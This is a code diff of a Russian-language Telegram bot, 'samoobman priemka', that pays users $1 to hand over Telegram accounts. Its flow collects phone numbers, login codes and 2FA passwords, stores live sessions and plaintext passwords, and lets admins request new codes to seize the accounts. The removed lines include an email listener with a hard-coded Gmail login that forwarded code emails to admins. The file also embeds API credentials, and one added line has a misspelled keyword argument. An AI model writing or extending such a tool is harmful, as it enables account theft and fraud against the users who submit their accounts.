@@ -6,9 +6,6 @@
 import asyncio
 import logging
 import os
-import imaplib
-import email
-from email.header import decode_header
 import aiosqlite
 from aiogram import Bot, Dispatcher, F, Router
 from aiogram.filters import Command
@@ -45,11 +42,6 @@ LOGS_CHANNEL_ID = -1003813816419
 API_ID = 31063615  # Число (int) для Telethon
 API_HASH = "dbe3b8f435016b0dcd3e4bca995a9169"
 
-# Настройки почты для чтения кодов
-TARGET_EMAIL = "wintya732@gmail.com"
-EMAIL_PASSWORD = "18s0ssh77m1gZ"
-IMAP_SERVER = "imap.gmail.com"
-
 DB_PATH = "database.db"
 SESSIONS_DIR = "sessions_data"
 os.makedirs(SESSIONS_DIR, exist_ok=True)
@@ -75,7 +67,6 @@ class AdminStates(StatesGroup):
     waiting_for_photo_profile = State()
     waiting_for_photo_withdraw = State()
     waiting_for_photo_submit = State()
-    waiting_for_manual_code_phone = State()
 
 
 class WithdrawStates(StatesGroup):
@@ -279,64 +270,8 @@ async def send_log(text: str):
         logger.error(f"Не удалось отправить лог: {e}")
 
 
-# ФОНОВЫЙ МОНИТОРИНГ ПОЧТЫ ДЛЯ ПЕРЕСЫЛКИ КОДОВ ТЕЛЕГРАМА
-async def email_listener_worker():
-    await asyncio.sleep(5)
-    processed_msg_ids = set()
-    while True:
-        try:
-            mail = imaplib.IMAP4_SSL(IMAP_SERVER)
-            mail.login(TARGET_EMAIL, EMAIL_PASSWORD)
-            mail.select("INBOX")
-
-            status, messages = mail.search(None, '(UNSEEN)')
-            if status == 'OK':
-                for num in messages[0].split():
-                    if num in processed_msg_ids:
-                        continue
-                    res, msg_data = mail.fetch(num, '(RFC822)')
-                    for response in msg_data:
-                        if isinstance(response, tuple):
-                            msg = email.message_from_bytes(response[1])
-                            subject, encoding = decode_header(msg["Subject"])[0]
-                            if isinstance(subject, bytes):
-                                subject = subject.decode(encoding or "utf-8", errors="ignore")
-
-                            body = ""
-                            if msg.is_multipart():
-                                for part in msg.walk():
-                                    if part.get_content_type() == "text/plain":
-                                        payload = part.get_payload(decode=True)
-                                        if payload:
-                                            body = payload.decode("utf-8", errors="ignore")
-                                            break
-                            else:
-                                payload = msg.get_payload(decode=True)
-                                if payload:
-                                    body = payload.decode("utf-8", errors="ignore")
-
-                            if "telegram" in subject.lower() or "telegram" in msg.get("From",
-                                                                                      "").lower() or "код" in body.lower():
-                                processed_msg_ids.add(num)
-                                alert_text = (
-                                    f"📧 **Получено письмо с кодом Telegram!**\n\n"
-                                    f"• **Тема:** {subject}\n"
-                                    f"• **Текст/Код:**\n{body.strip()}"
-                                )
-                                for admin_id in ADMIN_IDS:
-                                    try:
-                                        await bot.send_message(chat_id=admin_id, text=alert_text, parse_mode="Markdown")
-                                    except Exception:
-                                        pass
-            mail.logout()
-        except Exception as e:
-            logger.error(f"Ошибка в фоновом мониторинге почты: {e}")
-
-        await asyncio.sleep(15)
-
-
-async def finalize_auth_and_success(message: Message, state: FSMContext, client: TelegramClient, phone: str,
-                                    session_name: str, has_2fa: bool = False, password_used: str = None):
+async def finalize_auth_and_success(client: TelegramClient, phone: str, session_name: str, user_id: int,
+                                    has_2fa: bool = False, password_used: str = None):
     await client.disconnect()
 
     async with aiosqlite.connect(DB_PATH) as db:
@@ -346,7 +281,7 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
         )
         await db.execute(
             "UPDATE users SET balance = balance + 1.0, total_earned = total_earned + 1.0 WHERE user_id = ?",
-            (message.from_user.id,)
+            (user_id,)
         )
         await db.commit()
 
@@ -356,8 +291,8 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
             await bot.send_message(
                 chat_id=admin_id,
                 text=(
-                    f"📥 **Новый аккаунт успешно принят!**\n\n"
-                    f"• Пользователь: `{message.from_user.id}`\n"
+                    f"📥 **Аккаунт успешно принят в систему!**\n\n"
+                    f"• Пользователь: `{user_id}`\n"
                     f"• Телефон: `{phone}`"
                     f"{pwd_info}"
                 ),
@@ -367,26 +302,15 @@ async def finalize_auth_and_success(message: Message, state: FSMContext, client:
             logger.error(f"Не удалось отправить уведомление админу: {ex}")
 
     await send_log(
-        f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{message.from_user.id}`\nТелефон: `{phone}`"
+        f"🔔 [samoobman priemka] Успешная сдача аккаунта!\nЮзер: `{user_id}`\nТелефон: `{phone}`"
     )
 
-    data = await state.get_data()
-    prompt_msg_id = data.get("prompt_msg_id")
-    success_text = "✅ Аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
-
-    if prompt_msg_id:
-        try:
-            await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=success_text,
-                                        reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                                        parse_mode="Markdown")
-        except Exception:
-            await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                                 parse_mode="Markdown")
-    else:
-        await message.answer(success_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                             parse_mode="Markdown")
-
-    await state.clear()
+    try:
+        success_text = "✅ Ваш аккаунт успешно проверен и принят!\n💰 Вам автоматически начислен бонус **$1.00** на баланс."
+        await bot.send_message(chat_id=user_id, text=success_text, reply_markup=get_main_keyboard(user_id in ADMIN_IDS),
+                               parse_mode="Markdown")
+    except Exception:
+        pass
 
 
 # ================= ОБРАБОТЧИКИ КОМАНД И КНОПОК =================
@@ -456,7 +380,7 @@ async def cb_profile(callback: CallbackQuery):
     await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_profile")
 
 
-# --- СДАТЬ ТГ ---
+# --- СДАТЬ ТГ АККАУНТ (ПОЛЬЗОВАТЕЛЬСКИЙ ВВОД КОДА) ---
 @router.callback_query(F.data == "menu_submit_tg")
 async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
     text = (
@@ -465,7 +389,6 @@ async def cb_submit_tg(callback: CallbackQuery, state: FSMContext):
         "формате (например, `+79991112233`):"
     )
     await edit_to_photo_or_text(callback.message, text, get_back_keyboard(), "photo_submit")
-    await state.update_data(prompt_msg_id=callback.message.message_id)
     await state.set_state(AuthStates.waiting_for_phone)
 
 
@@ -477,67 +400,15 @@ async def process_phone(message: Message, state: FSMContext):
         pass
 
     phone = message.text.strip()
-    data = await state.get_data()
-    prompt_msg_id = data.get("prompt_msg_id")
-
     if not phone.startswith("+"):
-        err_text = "❌ Неверный формат. Номер должен начинаться с плюса (+). Попробуйте снова:"
-        if prompt_msg_id:
-            try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
-                                            reply_markup=get_back_keyboard())
-            except Exception:
-                pass
+        await message.answer("❌ Неверный формат. Номер должен начинаться с плюса (+). Попробуйте снова:")
         return
 
-    async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute(
-            "INSERT INTO submit_requests (user_id, phone, status, date) VALUES (?, ?, 'pending', datetime('now'))",
-            (message.from_user.id, phone)
-        )
-        await db.commit()
+    uid = message.from_user.id
+    status_msg = await message.answer(f"⏳ Отправляю запрос кода на номер `{phone}`...", parse_mode="Markdown")
 
-    for admin_id in ADMIN_IDS:
-        try:
-            await bot.send_message(
-                chat_id=admin_id,
-                text=f"📥 **Новая заявка на сдачу аккаунта!**\n\n• Юзер ID: `{message.from_user.id}`\n• Телефон: `{phone}`",
-                parse_mode="Markdown"
-            )
-        except Exception:
-            pass
-
-    waiting_text = "⏳ Номер принят! Пожалуйста, ожидайте, пока администратор запросит код подтверждения."
-    if prompt_msg_id:
-        try:
-            await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=waiting_text,
-                                        reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                                        parse_mode="Markdown")
-        except Exception:
-            await message.answer(waiting_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                                 parse_mode="Markdown")
-    else:
-        await message.answer(waiting_text, reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS),
-                             parse_mode="Markdown")
-
-    await state.clear()
-
-
-# Обработка нажатия юзером кнопки «Ввести код» (из старых заявок)
-@router.callback_query(F.data.startswith("user_enter_code_"))
-async def user_click_enter_code(callback: CallbackQuery, state: FSMContext):
-    acc_id = int(callback.data.split("_")[3])
-
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT phone, session_name FROM accounts WHERE id = ?", (acc_id,)) as cursor:
-            row = await cursor.fetchone()
-
-    if not row:
-        return await callback.answer("❌ Сессия не найдена или устарела.", show_alert=True)
-
-    phone, session_name = row
-    session_file_path = f"{session_name}.session"
-    client = TelegramClient(session_file_path, int(API_ID), str(API_HASH))
+    session_name = os.path.join(SESSIONS_DIR, f"session_{uid}_{int(asyncio.get_event_loop().time())}")
+    client = TelegramClient(session_name, int(API_ID), str(API_HASH))
 
     try:
         await client.connect()
@@ -546,23 +417,28 @@ async def user_click_enter_code(callback: CallbackQuery, state: FSMContext):
         await state.update_data(
             client=client,
             phone=phone,
-            session_name=session_name,
             phone_code_hash=sent.phone_code_hash,
-            prompt_msg_id=callback.message.message_id
+            session_name=session_name,
+            uid=uid,
+            status_msg_id=status_msg.message_id
         )
-        await state.set_state(AuthStates.waiting_for_code)
 
-        await callback.message.edit_text(
-            f"📲 Введите код подтверждения, который пришел на номер `{phone}`:",
+        await status_msg.edit_text(
+            f"📱 Код отправлен от Telegram на номер `{phone}`.\n\n"
+            f"Пожалуйста, введите полученный 5-значный код в чат:",
             reply_markup=get_back_keyboard(),
             parse_mode="Markdown"
         )
+        await state.set_state(AuthStates.waiting_for_code)
+
     except Exception as e:
         try:
             await client.disconnect()
         except Exception:
             pass
-        await callback.answer(f"❌ Ошибка: {e}", show_alert=True)
+        await status_msg.edit_text(f"❌ Ошибка отправки кода: `{e}`", reply_markup=get_main_keyboard(uid in ADMIN_IDS),
+                                   parse_mode="Markdown")
+        await state.clear()
 
 
 @router.message(AuthStates.waiting_for_code)
@@ -576,45 +452,53 @@ async def process_code(message: Message, state: FSMContext):
     data = await state.get_data()
     client: TelegramClient = data.get("client")
     phone = data.get("phone")
-    session_name = data.get("session_name")
     phone_code_hash = data.get("phone_code_hash")
-    prompt_msg_id = data.get("prompt_msg_id")
-
-    if not client:
-        await message.answer("❌ Сессия истекла. Начните заново.",
-                             reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
-        return await state.clear()
+    session_name = data.get("session_name")
+    uid = data.get("uid")
+    status_msg_id = data.get("status_msg_id")
 
     try:
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-        await finalize_auth_and_success(message, state, client, phone, session_name, has_2fa=False)
-    except SessionPasswordNeededError:
-        pwd_text = "🔐 На вашем аккаунте установлен облачный пароль (двухэтапная аутентификация).\nПожалуйста, введите ваш пароль от аккаунта:"
-        if prompt_msg_id:
+
+        async with aiosqlite.connect(DB_PATH) as db:
+            await db.execute(
+                "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, '', datetime('now'))",
+                (uid, phone, session_name)
+            )
+            await db.commit()
+
+        await finalize_auth_and_success(client, phone, session_name, uid, has_2fa=False)
+        if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=pwd_text,
+                await bot.delete_message(chat_id=message.chat.id, message_id=status_msg_id)
+            except Exception:
+                pass
+        await state.clear()
+
+    except SessionPasswordNeededError:
+        await state.update_data(status_msg_id=status_msg_id)
+        err_text = "🔐 На вашем аккаунте установлен облачный пароль (2FA).\nВведите ваш пароль в чат:"
+        if status_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
                                             reply_markup=get_back_keyboard())
             except Exception:
                 pass
         await state.set_state(AuthStates.waiting_for_password)
-    except (PhoneCodeInvalidError, PhoneCodeEmptyError):
-        err_text = "❌ Неверный код. Попробуйте ввести правильный код:"
-        if prompt_msg_id:
+        return
+
+    except Exception as e:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        err_text = f"❌ Неверный код или ошибка: `{e}`\nВведите код повторно:"
+        if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
                                             reply_markup=get_back_keyboard())
             except Exception:
                 pass
-    except Exception as e:
-        err_text = f"❌ Ошибка авторизации: {e}"
-        if prompt_msg_id:
-            try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
-                                            reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
-            except Exception:
-                pass
-        await client.disconnect()
-        await state.clear()
 
 
 @router.message(AuthStates.waiting_for_password)
@@ -629,30 +513,39 @@ async def process_password(message: Message, state: FSMContext):
     client: TelegramClient = data.get("client")
     phone = data.get("phone")
     session_name = data.get("session_name")
-    prompt_msg_id = data.get("prompt_msg_id")
+    uid = data.get("uid")
+    status_msg_id = data.get("status_msg_id")
 
     try:
         await client.sign_in(password=password)
-        await finalize_auth_and_success(message, state, client, phone, session_name, has_2fa=True,
-                                        password_used=password)
-    except PasswordHashInvalidError:
-        err_text = "❌ Неверный пароль. Попробуйте ввести правильный облачный пароль:"
-        if prompt_msg_id:
+
+        async with aiosqlite.connect(DB_PATH) as db:
+            await db.execute(
+                "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, ?, datetime('now'))",
+                (uid, phone, session_name, password)
+            )
+            await db.commit()
+
+        await finalize_auth_and_success(client, phone, session_name, uid, has_2fa=True, password_used=password)
+        if status_msg_id:
             try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
+                await bot.delete_message(chat_id=message.chat.id, message_id=status_msg_id)
+            except Exception:
+                pass
+        await state.clear()
+
+    except Exception as e:
+        try:
+            await client.disconnect()
+        except Exception:
+            pass
+        err_text = f"❌ Неверный пароль или ошибка: `{e}`\nВведите пароль снова:"
+        if status_msg_id:
+            try:
+                await bot.edit_message_text(chat_id=message.chat.id, message_id=status_msg_id, text=err_text,
                                             reply_markup=get_back_keyboard())
             except Exception:
                 pass
-    except Exception as e:
-        err_text = f"❌ Ошибка входа по паролю: {e}"
-        if prompt_msg_id:
-            try:
-                await bot.edit_message_text(chat_id=message.chat.id, message_id=prompt_msg_id, text=err_text,
-                                            reply_markup=get_main_keyboard(message.from_user.id in ADMIN_IDS))
-            except Exception:
-                pass
-        await client.disconnect()
-        await state.clear()
 
 
 # --- ВЫВОД СРЕДСТВ ---
@@ -805,8 +698,7 @@ async def cb_admin_panel(callback: CallbackQuery):
         return await callback.answer("Доступ запрещен.", show_alert=True)
 
     admin_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📥 Заявки", callback_data="admin_requests_list")],
-        [InlineKeyboardButton(text="📦 Успешные аккаунты", callback_data="admin_accounts_list")],
+        [InlineKeyboardButton(text="📦 Завершенные сделки (Аккаунты)", callback_data="admin_accounts_list")],
         [InlineKeyboardButton(text="🖼 Управление картинками", callback_data="admin_photos_menu")],
         [InlineKeyboardButton(text="📊 Юзеры в TXT таблицу", callback_data="admin_export_txt")],
         [InlineKeyboardButton(text="💵 Изменить баланс юзеру", callback_data="admin_change_balance")],
@@ -819,132 +711,7 @@ async def cb_admin_panel(callback: CallbackQuery):
     )
 
 
-# --- СПИСОК НОВЫХ ЗАЯВОК ДЛЯ АДМИНА ---
-@router.callback_query(F.data == "admin_requests_list")
-async def admin_requests_list(callback: CallbackQuery):
-    if callback.from_user.id not in ADMIN_IDS:
-        return
-
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute(
-                "SELECT id, user_id, phone, date FROM submit_requests WHERE status = 'pending' ORDER BY id DESC") as cursor:
-            requests = await cursor.fetchall()
-
-    if not requests:
-        kb = InlineKeyboardMarkup(
-            inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
-        return await callback.message.edit_text("📭 Активных заявок на сдачу аккаунтов нет.", reply_markup=kb,
-                                                parse_mode="Markdown")
-
-    kb_buttons = []
-    for req in requests:
-        req_id, uid, phone, date_str = req
-        kb_buttons.append([InlineKeyboardButton(text=f"📞 {phone} (ID: {uid})", callback_data=f"adm_view_req_{req_id}")])
-
-    kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
-
-    await callback.message.edit_text(
-        "📥 **Список заявок от пользователей:**\nВыберите заявку, чтобы запросить код:",
-        reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons),
-        parse_mode="Markdown"
-    )
-
-
-@router.callback_query(F.data.startswith("adm_view_req_"))
-async def adm_view_request(callback: CallbackQuery):
-    if callback.from_user.id not in ADMIN_IDS:
-        return
-
-    req_id = int(callback.data.split("_")[3])
-
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT user_id, phone, date FROM submit_requests WHERE id = ?", (req_id,)) as cursor:
-            row = await cursor.fetchone()
-
-    if not row:
-        return await callback.answer("❌ Заявка не найдена или уже обработана.", show_alert=True)
-
-    uid, phone, date_str = row
-    text = (
-        f"📋 **Детали заявки #{req_id}**\n\n"
-        f"• **Пользователь ID:** `{uid}`\n"
-        f"• **Телефон:** `{phone}`\n"
-        f"• **Дата заявки:** {date_str}"
-    )
-
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="📲 Запросить код", callback_data=f"adm_req_sendcode_{req_id}")],
-        [InlineKeyboardButton(text="❌ Отклонить заявку", callback_data=f"adm_req_cancel_{req_id}")],
-        [InlineKeyboardButton(text="⬅️ К списку заявок", callback_data="admin_requests_list")],
-    ])
-
-    await callback.message.edit_text(text, reply_markup=kb, parse_mode="Markdown")
-
-
-@router.callback_query(F.data.startswith("adm_req_sendcode_"))
-async def adm_request_code_for_submit(callback: CallbackQuery):
-    if callback.from_user.id not in ADMIN_IDS:
-        return
-
-    req_id = int(callback.data.split("_")[3])
-
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute("SELECT user_id, phone FROM submit_requests WHERE id = ?", (req_id,)) as cursor:
-            row = await cursor.fetchone()
-
-    if not row:
-        return await callback.answer("❌ Заявка не найдена.", show_alert=True)
-
-    uid, phone = row
-    session_name = os.path.join(SESSIONS_DIR, f"session_{uid}_{int(asyncio.get_event_loop().time())}")
-
-    async with aiosqlite.connect(DB_PATH) as db:
-        async with db.execute(
-                "INSERT INTO accounts (user_id, phone, session_name, password, date) VALUES (?, ?, ?, '', datetime('now'))",
-                (uid, phone, session_name)
-        ) as cursor:
-            acc_id = cursor.lastrowid
-        await db.execute("UPDATE submit_requests SET status = 'completed' WHERE id = ?", (req_id,))
-        await db.commit()
-
-    try:
-        user_kb = InlineKeyboardMarkup(inline_keyboard=[
-            [InlineKeyboardButton(text="💬 Ввести код", callback_data=f"user_enter_code_{acc_id}")]
-        ])
-        await bot.send_message(
-            chat_id=uid,
-            text=f"📲 Администратор запросил код подтверждения для вашего номера `{phone}`.\n\nНажмите кнопку ниже, чтобы ввести полученный код:",
-            reply_markup=user_kb,
-            parse_mode="Markdown"
-        )
-    except Exception as e:
-        logger.error(f"Не удалось отправить уведомление юзеру {uid}: {e}")
-
-    kb = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="🔄 Запросить код автоматически", callback_data=f"adm_acc_code_{acc_id}")],
-        [InlineKeyboardButton(text="⬅️ В админ-панель", callback_data="admin_panel")]
-    ])
-
-    await callback.message.edit_text(
-        f"✅ **Код успешно инициирован для номера `{phone}`!**\n\nПользователю отправлена кнопка для ввода кода.",
-        reply_markup=kb,
-        parse_mode="Markdown"
-    )
-
-
-@router.callback_query(F.data.startswith("adm_req_cancel_"))
-async def adm_cancel_request(callback: CallbackQuery):
-    if callback.from_user.id not in ADMIN_IDS:
-        return
-    req_id = int(callback.data.split("_")[3])
-    async with aiosqlite.connect(DB_PATH) as db:
-        await db.execute("UPDATE submit_requests SET status = 'cancelled' WHERE id = ?", (req_id,))
-        await db.commit()
-    await callback.message.edit_text("❌ Заявка отклонена.", reply_markup=InlineKeyboardMarkup(
-        inline_keyboard=[[InlineKeyboardButton(text="⬅️ К заявкам", callback_data="admin_requests_list")]]))
-
-
-# --- УСПЕШНЫЕ АККАУНТЫ (АВТОМАТИЧЕСКИЙ ЗАПРОС КОДА ДЛЯ АДМИНА) ---
+# --- ЗАВЕРШЕННЫЕ СДЕЛКИ / УСПЕШНЫЕ АККАУНТЫ ---
 @router.callback_query(F.data == "admin_accounts_list")
 async def admin_accounts_list(callback: CallbackQuery):
     if callback.from_user.id not in ADMIN_IDS:
@@ -958,20 +725,21 @@ async def admin_accounts_list(callback: CallbackQuery):
     if not accounts:
         kb = InlineKeyboardMarkup(
             inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")]])
-        return await callback.message.edit_text("📭 В базе пока нет сохраненных аккаунтов.", reply_markup=kb,
+        return await callback.message.edit_text("📭 Завершенных сделок пока нет.", reply_markup=kb,
                                                 parse_mode="Markdown")
 
     kb_buttons = []
     for acc in accounts:
         acc_id, uid, phone, pwd, date_str = acc
-        pwd_status = f" | 🔑 {pwd}" if pwd else ""
-        kb_buttons.append(
-            [InlineKeyboardButton(text=f"📱 {phone} (ID {uid}){pwd_status}", callback_data=f"adm_acc_code_{acc_id}")])
+        pwd_text = f" | Пароль: {pwd}" if pwd else " | Без пароля"
+        kb_buttons.append([InlineKeyboardButton(text=f"📱 {phone}{pwd_text}", callback_data=f"adm_acc_code_{acc_id}")])
 
     kb_buttons.append([InlineKeyboardButton(text="⬅️ Назад в админ-панель", callback_data="admin_panel")])
 
     await callback.message.edit_text(
-        "📦 **Список успешных аккаунтов**\nНажмите на аккаунт, чтобы **автоматически запросить код**:",
+        "📦 **Завершенные сделки (Успешные аккаунты)**\n"
+        "Здесь отображается пароль, который вводил пользователь при сдаче.\n"
+        "Нажмите на любой аккаунт, чтобы бот **запросил новый код у Telegram**:",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=kb_buttons),
         parse_mode="Markdown"
     )
@@ -995,40 +763,27 @@ async def admin_auto_request_code(callback: CallbackQuery):
     uid, phone, session_name, password = row
     session_file_path = f"{session_name}.session"
 
-    await callback.message.edit_text(f"⏳ Подключаюсь к аккаунту `{phone}` и запрашиваю код...", parse_mode="Markdown")
+    await callback.message.edit_text(f"⏳ Подключаюсь к аккаунте `{phone}` и запрашиваю код у Telegram...",
+                                     parse_mode="Markdown")
 
     client = TelegramClient(session_file_path, int(API_ID), str(API_HASH))
     try:
         await client.connect()
 
-        # Проверяем, авторизован ли клиент уже
-        if await client.is_user_authorized():
-            me = await client.get_me()
-            await client.disconnect()
-
-            kb = InlineKeyboardMarkup(inline_keyboard=[
-                [InlineKeyboardButton(text="🔄 Запросить снова", callback_data=f"adm_acc_code_{acc_id}")],
-                [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]
-            ])
-            return await callback.message.edit_text(
-                f"✅ **Аккаунт уже авторизован!**\n\n• Телефон: `{phone}`\n• Имя: {me.first_name}\n• Username: @{me.username or 'отсутствует'}",
-                reply_markup=kb, parse_mode="Markdown"
-            )
-
-        # Если не авторизован, отправляем запрос кода
+        # Запрашиваем код у Telegram (он прилетит на аккаунт/устройство пользователя)
         await client.send_code_request(phone)
         await client.disconnect()
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔄 Запросить код повторно", callback_data=f"adm_acc_code_{acc_id}")],
-            [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]
+            [InlineKeyboardButton(text="⬅️ К списку сделок", callback_data="admin_accounts_list")]
         ])
 
-        pwd_display = f"\n• 🔑 Сохраненный 2FA Пароль: `{password}`" if password else "\n• 🔑 2FA Пароль: Отсутствует"
+        pwd_display = f"\n• 🔑 Введенный пароль: `{password}`" if password else "\n• 🔑 Введенный пароль: Отсутствует"
 
         await callback.message.edit_text(
-            f"✅ **Код успешно отправлен на аккаунт `{phone}`!**{pwd_display}\n\n"
-            f"Бот ожидает поступления кода (письмо проверится автоматически через почту или вы можете запросить код повторно).",
+            f"✅ **Запрос кода для `{phone}` успешно отправлен в Telegram!**{pwd_display}\n\n"
+            f"ℹ️ Код отправлен в официальное приложение Telegram на аккаунте. Проверьте его на устройстве.",
             reply_markup=kb,
             parse_mode="Markdown"
         )
@@ -1041,7 +796,7 @@ async def admin_auto_request_code(callback: CallbackQuery):
 
         kb = InlineKeyboardMarkup(inline_keyboard=[
             [InlineKeyboardButton(text="🔄 Попробовать снова", callback_data=f"adm_acc_code_{acc_id}")],
-            [InlineKeyboardButton(text="⬅️ К списку аккаунтов", callback_data="admin_accounts_list")]
+            [InlineKeyboardButton(text="⬅️ К списку сделок", callback_data="admin_accounts_list")]
         ])
         await callback.message.edit_text(
             f"❌ **Ошибка при запросе кода для `{phone}`:**\n`{e}`",
@@ -1244,7 +999,7 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
             await bot.send_message(
                 chat_id=u[0],
                 text=f"📢 **Рассылка от samoobman priemka**\n\n{text}",
-                parse_mode="Markdown"
+                parse_Mode="Markdown"
             )
             count += 1
             await asyncio.sleep(0.05)
@@ -1259,8 +1014,6 @@ async def admin_send_broadcast(message: Message, state: FSMContext):
 async def main():
     await init_db()
     logger.info("Бот samoobman priemka успешно запущен!")
-
-    asyncio.create_task(email_listener_worker())
 
     await dp.start_polling(bot)
 
